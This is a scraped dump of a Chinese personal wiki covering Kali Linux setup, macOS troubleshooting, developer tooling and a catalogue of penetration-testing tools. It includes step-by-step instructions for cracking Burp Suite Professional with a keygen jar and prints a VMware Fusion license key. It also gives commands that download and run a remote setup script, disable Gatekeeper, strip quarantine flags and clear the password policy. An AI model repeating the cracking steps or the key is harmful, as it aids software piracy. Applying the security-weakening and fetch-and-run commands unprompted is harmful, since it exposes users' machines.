https://raw.githubusercontent.com/44maker/kaliinit/main/kalisetup.sh &amp;&amp; chmod +x kalisetup.sh &amp;&amp; bash kalisetup.sh 执行完成后 12source ~/.zshrcrm -rf kalisetup.sh 即可上手使用 1234#使用impacketpyenv activate impacket#退出source deactivate 手动配置换源1sudo vim /etc/apt/sources.list 下面的源中选择一个即可中科大源 12deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contribdeb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib 清华源 12deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-freedeb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free 阿里源 12deb http://mirrors.aliyun.com/kali kali-rolling main non-free contribdeb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib 官方源 12deb http://http.kali.org/kali kali-rolling main no-free contribdeb-src http://http.kali.org/kali kali-rolling main non-free contrib 完成之后按esc 再输入 :wq即保存退出再进行更新 1234sudo apt updatesudo apt upgrade -ysudo apt dist-upgrade -ysudo reboot now 安装网卡驱动如果有ALFA型号的RTL2AU外接网卡，是需要在kali中安装驱动才可以使用的 123456sudo apt install realtek-rtl88xxau-dkms -ysudo apt install dkms -ygit clone https://github.com/aircrack-ng/rtl8812aucd rtl8812au/makesudo make install 检查&amp;测试 123lsusbiwconfigsudo wifite 软件配置Tmux1nano ~/.tmux.conf 1234567891011121314#tmux attach 如果无分离终端则新建new-session# split panes using | and -bind | split-window -hbind - split-window -vunbind &#x27; &quot; &#x27;unbind %bind -r k select-pane -U # 绑定k为↑bind -r j select-pane -D # 绑定j为↓bind -r h select-pane -L # 绑定h为←bind -r l select-pane -R # 绑定l为→# reload config file (change file location to your the tmux.conf you want to use)bind r source-file ~/.tmux.conf; display-message &quot;Config reloaded..&quot;bind V source-file ~/.tmux/layout1 #ctrl b + shift v =&gt; change 12mkdir ~/.tmuxnano ~/.tmux/layout1 12345selectp -t 0 # select the first (0) panesplitw -v -p 50 # split it into two halvesselectp -t 1 # select the new, second (1) panesplitw -h -p 50 # split it into two halvesselectp -t 0 # go back to the first pane 常用命令：最大化 复制模式 q退出 窗口列表 切换窗口 会话列表 挂起 中文输入法123sudo apt install fcitxsudo apt-get install fcitx-googlepinyinreboot 点击桌面右上角输入法图标,点击Configure去掉Only Show Current Language,选中Google Pinyin,OKctrl+空格切换 sublime-text官网下载链接 123chmod +x sublime-text_build-xxxx_amd64.debsudo dpkg -i sublime-text_build-xxxx_amd64.debrm sublime-text_build-xxxx_amd64.deb"},{"title":"常见问题","path":"/wiki/Mac/problem.html","content":"xxx.app 已损坏，无法打开，你应该将它移到废纸篓&#x2F;打不开 xxx，因为它来自身份不明的开发者解决方法方法1 开启任何来源 先打开 系统偏好设置 -&gt; 安全与隐私 -&gt; 通用 选项卡，检查是否已经启用了 任何来源 选项。 如果没有这个选项，复制以下面的命令：1sudo spctl --master-disable 重新安装文件 方法2 应用签名安装Command Line Tools 工具打开终端工具输入如下命令： 打开终端工具输入并执行如下命令对应用签名： 1sudo codesign --force --deep --sign - (应用路径) 应用路径：打开访达（Finder），点击左侧导航栏的 应用程序，找到相关应用，将它拖进终端命令- 的后面，然后按下回车即可，注意最后一个 - 后面有一个空格。正常情况下只有一行提示，即成功：/文件位置 : replacing existing signature 如遇如下错误：/文件位置 : replacing existing signature /文件位置 : resource fork,Finder information,or similar detritus not allowed先在终端执行： 1xattr -cr /文件位置（直接将应用拖进去即可） 然后再次执行如下指令即可： 1codesign --force --deep --sign - /文件位置（直接将应用拖进去即可） 绕过公证打开终端，输入以下命令： 1sudo xattr -rd com.apple.quarantine /Applications/xxxxxx.app 将上面的 xxxxxx.app 换成App名称，比如 Sketch.appsudo xattr -rd com.apple.quarantine /Applications/Sketch.app然后按键盘的回车键（return），输入密码，再按回车键，完成。"},{"title":"上手验机","path":"/wiki/Mac/test.html","content":"查序列号官网查询 开箱检查外观 开机 点击左上角的苹果按钮，点击关于本机 点击系统报告 核对型号参数 点击电源，核对效能信息中的循环计数 10次以下为正常 自检硬件(可选) 关机，断开其他连接设备 长按开机键，直到出现选项 长按command+d 选择语言 选择我同意 在线屏幕检测🖥️"},{"title":"小技巧","path":"/wiki/Mac/skill.html","content":"Mac双开微信1open -n /Applications/WeChat.app/Contents/MacOS/WeChat"},{"title":"开发配置","path":"/wiki/Mac/program.html","content":"iTerm2没有一个好看的终端怎么行 1brew install --cask iterm2 终端美化Starship安装 1brew install starship 1echo &#x27;eval &quot;$(starship init zsh)&quot;&#x27; &gt;&gt; ~/.zshrc 配置文件 1234mkdir -p ~/.configcd ~/.configwget https://raw.githubusercontent.com/44maker/kaliinit/main/starship.tomlcd ~ 卸载sharship 删除 shell 配置中~/.zshrc用于初始化 Starship 的所有行 删除 Starship Tmux安装终端复用神器 1brew install tmux 教程Tmux 使用教程- 阮一峰的网络日志Tmux使用手册 配置文件1nano ~/.tmux.conf 1234567891011121314#tmux attach 如果无分离终端则新建new-session# split panes using | and -bind | split-window -hbind - split-window -vunbind &#x27; &quot; &#x27;unbind %bind -r k select-pane -U # 绑定k为↑bind -r j select-pane -D # 绑定j为↓bind -r h select-pane -L # 绑定h为←bind -r l select-pane -R # 绑定l为→# reload config file (change file location to your the tmux.conf you want to use)bind r source-file ~/.tmux.conf; display-message &quot;Config reloaded..&quot;bind V source-file ~/.tmux/layout1 12mkdir ~/.tmuxnano ~/.tmux/layout1 12345selectp -t 0 # select the first (0) panesplitw -v -p 50 # split it into two halvesselectp -t 1 # select the new, second (1) panesplitw -h -p 50 # split it into two halvesselectp -t 0 # go back to the first pane 完成后 之后使用的话，在终端输入tmux然后 Ctrl + B 再按 Shift + V就可以分屏了 常用命令最大化 复制模式 q退出 窗口列表 切换窗口 会话列表 挂起 Git12345# 配置邮箱 git config --global user.email &quot;xxxxx@xxx.com&quot;# 配置用户名git config --global user.name &quot;xxx&quot; Python在调试Python的时候可能遇到不同的环境问题，在这里先使用pyenv进行本地环境配置，后面如果做机器学习、深度学习等使用conda虚拟环境配置 1brew install pyenv 配置shell环境 1echo &#x27;eval &quot;$(pyenv init -)&quot;&#x27; &gt;&gt; ~/.zshrc 查看可安装的版本 安装与卸载 查看已安装的版本 1234#当前版本pyenv version#查看已经安装的Python版本pyenv versions 版本切换 12345678# shell 会话设置 只影响当前的shell会话pyenv shell &lt;python版本&gt;# 取消 shell 会话的设置pyenv shell --unset# local 本地设置 只影响所在文件夹pyenv local &lt;python版本&gt;# global 全局设置 一般不建议改变全局设置pyenv global &lt;python版本&gt; 注意pyenv 的 global、local、shell 的优先级关系是：shell > local > global JAVAJDK8https://www.123pan.com/s/L9uDVv-QQu7H.htmlJDK11https://www.123pan.com/s/L9uDVv-9Qu7H.htmlJDK17下载安装之后再安装jenv便于切换环境 1brew instal jenv 配置zshrc环境 12echo &#x27;export PATH=&quot;$HOME/.jenv/bin:$PATH&quot;&#x27; &gt;&gt; ~/.zshrcecho &#x27;eval &quot;$(jenv init -)&quot;&#x27; &gt;&gt; ~/.zshrc 安装完成后 1234567891011121314151617181920#查看当前的 Java 版本jenv version#列出目前 jenv 所有可切换管理的版本jenv versions#手动添加本地的 Java Home 路径jenv add /Library/Java/JavaVirtualMachines/jdk-20.jdk/Contents/Home/jenv add /Library/Java/JavaVirtualMachines/jdk1.8.0_291.jdk/Contents/Home/jenv add /Library/Java/JavaVirtualMachines/zulu-17.jdk/Contents/Home/#global 全局设置 一般不建议改变全局设置jenv global &lt;java 版本&gt;#shell 会话设置 只影响当前的shell会话jenv shell &lt;java 版本&gt;#取消 shell 会话的设置jenv shell --unset#local 本地设置 只影响所在文件夹jenv local &lt;java 版本&gt; Docker1brew install --cask docker OrbStackOrbStack 是一种在 macOS 上运行 Docker 容器和 Linux 机器的快速、轻便且简单的方法。可以将其视为强大的 WSL 和 Docker Desktop 替代方案，全部集成在一个易于使用的应用程序中 1brew install orbstack Docker切换OrbStack 1docker context use orbstack 在设置中可以进行换源 1234567891011121314&#123; &quot;ipv6&quot;: true, &quot;registry-mirrors&quot;: [ &quot;http://hub-mirror.c.163.com&quot;, &quot;https://registry.docker-cn.com&quot;, &quot;https://mirror.baidubce.com&quot;, &quot;https://kn77wnbv.mirror.aliyuncs.com&quot;, &quot;https://0dj0t5fb.mirror.aliyuncs.com&quot;, &quot;https://docker.nju.edu.cn&quot;, &quot;https://kuamavit.mirror.aliyuncs.com&quot;, &quot;https://y0qd3iq.mirror.aliyuncs.com&quot;, &quot;https://docker.mirrors.ustc.edu.cn&quot; ]&#125; Parallels DesktopMac上性能最好的虚拟化工具 UTMUTM 是一个功能齐全的系统模拟器和虚拟机主机，适用于 iOS 和 macOS。它基于 QEMU。所以可以模拟x86、ARM64 和 RISC-V。 1brew install --cask utm Vulnhubkali攻击机上官网下载iso文件导入即可官网下载然后到vulnhub查找自己想要练习的靶机，并下载ovavulnhub vulnhub国内镜像 12cd Downloadstar xvf xxx.ova 解压完成后安装一下qemu 1brew install qemu 转换成qcow2格式 1qemu-img convert -O qcow2 xxx-disk001.vmdk xxx.qcow2 打开UTM，选择左上角➕，新建选择模拟-&gt;其他-&gt;勾选跳过ISO启动-&gt;选择内存等-&gt;继续-&gt;填写名字-&gt;保存在主页面能看到新建的机器-&gt;右击编辑-&gt;选择QEMU-&gt;取消勾选UEFI启动右击IDE Drive删除再点击驱动器下方的新建-&gt;导入-&gt;选择刚刚生成的qcow2文件即可 x86在网上下载你想要模拟的x86系统的iso文件打开UTM-&gt;左上角➕-&gt;选择模拟-&gt;linux(或者windows)-&gt;调整内存-&gt;驱动器大小-&gt;名字-&gt;完成之后就可以正常打开使用了 VirtualBoxVirtualbox是一个开源的虚拟机工具可以在官网下载安装官网下载Virtualbox更加适用于打靶机的情况，比如hackmyvm靶场中大部分的靶机都是适配Virtualbox的 Vmware FusionVmware是除了PD以外非常优秀的虚拟机工具，如果觉得PD收费太高，那么可以选择Vmware官网下载 4C21U-2KK9Q-M8130-4V2QH-CF810 Firefox开源浏览器 1brew install --cask firefox Arc非常好看的浏览器，垂直标签栏能更好的保存网站分类 1brew install --cask arc 注意需要加入愿望单，获取名额 Electerm支持ssh&#x2F;sftp的客户端支持github，gitee同步 1brew install --cask electerm Insomnia一个用于GraphQL、REST、WebSockets、SSE和gRPC的开源、跨平台API客户端 1brew install --cask insomnia Vscode1brew install --cask visual-studio-code 官网下载 Miniconda安装下载安装包官方链接 清华镜像 12curl -O https://repo.anaconda.com/miniconda/Miniconda3-latest-MacOSX-arm64.shsh Miniconda3-latest-MacOSX-arm64.sh 在安装的最后会出现 12Do you wish the installer to initialize Miniconda3 by running conda init? [yes|no][yes] &gt;&gt;&gt; 输入yes此时安装包会向当前 SHELL 的配置文件（~&#x2F;.zshrc）中写入 conda 初始化语句查看conda版本，检查是否安装成功 配置取消激活base环境因为我们之前已经配置了本地python环境，为了区分用途[pyenv管理的python用于python开发等，conda用于机器学习、深度学习等]以上是我个人的习惯，如果只有单方面需求，使用对应的python配置方法即可安装Miniconda 后，打开终端默认会激活 base 环境所以通过命令取消掉 1conda config --set auto_activate_base False 想要在终端激活conda中的虚拟环境的时候 1conda activate base[虚拟环境名] 想要恢复默认激活base环境 1conda config --set auto_activate_base True conda-forgeconda-forge 是一个由社区维护的大量 Python 包的通道。 为 conda 增加 conda-forge 通道，可以安装更多的软件包 1conda config --add channels conda-forge 设置通道优先级为 strict。当一个包同时位于 conda-forge 和 main 通道时，总是使用 conda-forge 提供的包 1conda config --set channel_priority true 显示通道 URL 1conda config --set show_channel_urls true conda换源12conda config --add default_channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/mainconda config --set &#x27;custom_channels.conda-forge&#x27; https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud 设置 conda 使用更快的 libmamab solver 12conda install -n base conda-libmamba-solverconda config --set solver libmamba conda虚拟环境创建虚拟环境 1conda create -n py38 python=3.8 激活虚拟环境 1conda activate py38 查看已创建的虚拟环境 1conda env list 退出当前环境 1deactivate 环境名字 删除环境 1conda remove -n 环境名字 --all 删除环境钟的某个包 1conda remove -n 环境名字 包名 TensorFlow安装123conda install -c apple tensorflow-depspip install tensorflow-macospip install tensorflow-metal 测试12345conda activate py38pythonimport tensorflow as tfprint(&quot;tf version&quot;,tf.__version__)print(&quot;tf gpu&quot;,tf.test.is_gpu_available()) Pytorch安装Anaconda 1conda install pytorch torchvision torchaudio -c pytorch-nightly pip 1pip3 install --pre torch torchvision torchaudio --extra-index-url https://download.pytorch.org/whl/nightly/cpu 测试1234567import torchif torch.backends.mps.is_available(): mps_device = torch.device(&quot;mps&quot;) x = torch.ones(1, device=mps_device) print (x)else: print (&quot;MPS device not found.&quot;) The output should show: 1tensor([1.], device=&#x27;mps:0&#x27;) 安装一些常用的库 1pip install pandas matplotlib glob2 tqdm opencv-python scipy scikit-learn mlx Adobe全家桶https://www.yuque.com/yihulaojiu-gsfg9/zz2qv5/vixkf6"},{"title":"系统设置","path":"/wiki/Mac/system.html","content":"基本设置取消 4 位数密码限制 1pwpolicy -clearaccountpolicies 程序坞自动隐藏加速 1234567891011# 设置启动坞动画时间设置为 0.5 秒 defaults write com.apple.dock autohide-time-modifier -float 0.5 &amp;&amp; killall Dock# 设置启动坞响应时间最短defaults write com.apple.dock autohide-delay -int 0 &amp;&amp; killall Dock# 恢复启动坞默认动画时间defaults delete com.apple.dock autohide-time-modifier &amp;&amp; killall Dock# 恢复默认启动坞响应时间defaults delete com.apple.Dock autohide-delay &amp;&amp; killall Dock 启动台自定义行和列 123456789101112131415# 设置列数defaults write com.apple.dock springboard-columns -int 7# 设置行数defaults write com.apple.dock springboard-rows -int 6# 重启 Dock 生效killall Dock# 恢复默认的列数和行数defaults write com.apple.dock springboard-rows Defaultdefaults write com.apple.dock springboard-columns Default# 重启 Dock 生效killall Dock 键盘设置 触控板设置光标响应打开系统偏好设置-&gt;触控板-&gt;光标与点按勾选✔轻点来点按跟踪速度移动到最快 三指拖移打开系统偏好设置-&gt;辅助功能-&gt;指针控制"},{"title":"渗透工具","path":"/wiki/Mac/pentest.html","content":"注意因为渗透测试考虑到安全性，工具配置在虚拟机中更加合适，所以本文只介绍少数工具，详细信息请在Kali的wiki中查看 主机探测12brew install nmapbrew install arp-scan 抓包工具Burpsuite首先官网下载点开dmg文件安装，将注册jar将其放入到 BP Jar 包的同级目录下：注册jar下载 1cd /Applications/Burp\\ Suite\\ Professional.app/Contents/Resources/app &amp;&amp; &quot;/Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/bin/java&quot; &quot;--add-opens=java.desktop/javax.swing=ALL-UNNAMED&quot; &quot;--add-opens=java.base/java.lang=ALL-UNNAMED&quot; &quot;--add-opens=java.base/jdk.internal.org.objectweb.asm=ALL-UNNAMED&quot; &quot;--add-opens=java.base/jdk.internal.org.objectweb.asm.tree=ALL-UNNAMED&quot; &quot;--add-opens=java.base/jdk.internal.org.objectweb.asm.Opcodes=ALL-UNNAMED&quot; &quot;-javaagent:BurpLoaderKeygen.jar&quot; &quot;-jar&quot; &quot;/Applications/Burp Suite Professional.app/Contents/Resources/app/burpsuite_pro.jar&quot; 显示激活窗口 另外打开一个终端 1/Applications/Burp\\ Suite\\ Professional.app/Contents/Resources/jre.bundle/Contents/Home/bin/java -jar /Applications/Burp\\ Suite\\ Professional.app/Contents/Resources/app/BurpLoaderKeygen.jar 再运行下面的命令 1234567echo &quot;--add-opens=java.desktop/javax.swing=ALL-UNNAMED&quot; &gt;&gt; /Applications/Burp\\ Suite\\ Professional.app/Contents/vmoptions.txtecho &quot;--add-opens=java.base/java.lang=ALL-UNNAMED&quot; &gt;&gt; /Applications/Burp\\ Suite\\ Professional.app/Contents/vmoptions.txtecho &quot;--add-opens=java.base/jdk.internal.org.objectweb.asm=ALL-UNNAMED&quot; &gt;&gt; /Applications/Burp\\ Suite\\ Professional.app/Contents/vmoptions.txtecho &quot;--add-opens=java.base/jdk.internal.org.objectweb.asm.tree=ALL-UNNAMED&quot; &gt;&gt; /Applications/Burp\\ Suite\\ Professional.app/Contents/vmoptions.txtecho &quot;--add-opens=java.base/jdk.internal.org.objectweb.asm.Opcodes=ALL-UNNAMED&quot; &gt;&gt; /Applications/Burp\\ Suite\\ Professional.app/Contents/vmoptions.txtecho &quot;-javaagent:BurpLoaderKeygen.jar&quot; &gt;&gt; /Applications/Burp\\ Suite\\ Professional.app/Contents/vmoptions.txtecho &quot;-Xmx2048m&quot; &gt;&gt; /Applications/Burp\\ Suite\\ Professional.app/Contents/vmoptions.txt 那么激活完成，可以在应用程序中直接打开 YakitYakit官网选择macOS (Apple Sillion) Wireshark网络数据包分析官网下载 承影一款安全工具箱,集成了目录扫描、JWT、Swagger 测试、编&#x2F;解码、轻量级 BurpSuite、杀软辅助功能Github下载 SQL注入1brew install sqlmap 文件分析12brew install binwalkbrew install exiftool LovelyMem一款基于memprocfs的快捷内存取证工具https://github.com/Tokeii0/LovelyMem ImageStrike图片隐写工具https://github.com/zR00t1/ImageStrike Hex Fiend小巧的 Hex 文件查看器，支持自定义高亮选中展示应用商店下载 Shambles次世代嵌入式逆向工程神器智能扫描漏洞，固件对比，环境模拟官网 冰蝎动态二进制加密网站（WebShell）管理客户端Github下载 SiteSucker Pro下载网站下载链接 Metasploit下载最新版本的安装包：https://osx.metasploit.com/metasploitframework-latest.pkg双击点开安装安装路径为&#x2F;opt&#x2F;metasploit-framework&#x2F;bin配置环境变量 1echo &#x27;export PATH=&quot;$PATH:/opt/metasploit-framework/bin/&quot;&#x27; &gt;&gt; ~/.zshrc 重新打开终端 1234msfconsole# 输入 y 确定初始化一个新的数据库Would you like to use and setup a new database (recommended)? y Hashcat密码破解神器 1brew install hashcat ZipCracker压缩包密码破解https://github.com/asaotomo/ZipCracker"}]